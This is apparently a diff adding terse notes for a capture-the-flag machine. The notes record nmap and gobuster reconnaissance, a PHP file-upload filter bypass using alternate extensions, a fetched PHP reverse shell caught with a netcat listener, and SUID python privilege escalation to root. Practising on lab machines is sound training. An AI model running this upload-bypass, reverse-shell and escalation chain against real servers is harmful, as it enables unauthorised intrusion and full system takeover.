@@ -1,0 +1,52 @@
+
+R00TM3
+
+[+]GATHERING INFORMATION[+]
+nmap -p- --open -v -Pn -n --min-rate 5000 -sC -sV -oN allPorts 10.10.95.132
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: HackIT - Home
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+gobuster 
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.95.132/uploads/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.95.132/css/]    
+/js                   (Status: 301) [Size: 309] [--> http://10.10.95.132/js/]     
+/panel                (Status: 301) [Size: 312] [--> http://10.10.95.132/panel/]
+
+[+]REVERSHELL[+]
+wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
++ .php extension not valid to upload...
++ File Upload Bypass
+Other useful extensions:
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
+
++ php-reverse-shell.php5 upload sucessfull...
+
++ nc -lvnp 4444
++ GET SHELL
+
+find -name user.txt
+
+[+]PRIVILAGE ESCALATION[+]
+find / -perm /4000 2>/dev/null
+
++ python
+
++ GTFobins
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+root.txt
